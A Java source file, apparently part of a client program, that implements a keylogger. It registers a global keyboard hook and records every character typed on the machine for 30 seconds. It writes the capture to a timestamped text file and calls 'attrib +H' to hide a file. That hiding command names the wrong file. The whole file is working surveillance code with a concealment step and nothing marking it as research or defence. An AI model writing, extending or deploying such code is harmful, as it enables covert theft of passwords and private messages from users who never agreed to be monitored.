package client;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Calendar;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.BrokenBarrierException;
import java.util.concurrent.CyclicBarrier;

public class ListenToKeyboard implements NativeKeyListener, Runnable
{
    private String txt = "";
    private int TimeForAction = 30;
    CyclicBarrier barrier;

    public ListenToKeyboard(CyclicBarrier obarrier){
    	barrier = obarrier;
    }
    public void run()
    {
        Timer timer = new Timer();
        timer.schedule(new RemindTask(), TimeForAction * 1000);

        try
        {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException e)
        {
            e.printStackTrace();
        }

        GlobalScreen.getInstance().addNativeKeyListener(this);
    }

    public void nativeKeyTyped(NativeKeyEvent arg0)
    {
        txt += arg0.getKeyChar();

        if(arg0.getRawCode() == NativeKeyEvent.VK_BACK_SPACE && txt.length() > 1)
            txt = txt.substring(0, txt.length()-2);
    }

    public void nativeKeyPressed(NativeKeyEvent arg0) {}

    public void nativeKeyReleased(NativeKeyEvent arg0) {}

    public void closeListening() throws IOException, BrokenBarrierException, InterruptedException
    {
        Calendar calendar =  Calendar.getInstance();
        String timeStamp = calendar.getTime().toString().split(" ")[3];
        String filename =  "keys_" + timeStamp.replaceAll(":","_") + ".txt";

        File keyClicks = new File(filename);
        Runtime.getRuntime().exec("attrib +H keyclicks.txt");
        BufferedWriter output = new BufferedWriter(new FileWriter(keyClicks));

        output.write(txt);
        output.close();

        GlobalScreen.getInstance().removeNativeKeyListener(this);
        GlobalScreen.unregisterNativeHook();

        barrier.await();
    }

    class RemindTask extends TimerTask
    {
        public void run()
        {
            System.out.println("Time's up!");
            try {
                closeListening();
            }
            catch (IOException | InterruptedException | BrokenBarrierException e)
            {
                e.printStackTrace();
            }
        }
    }

}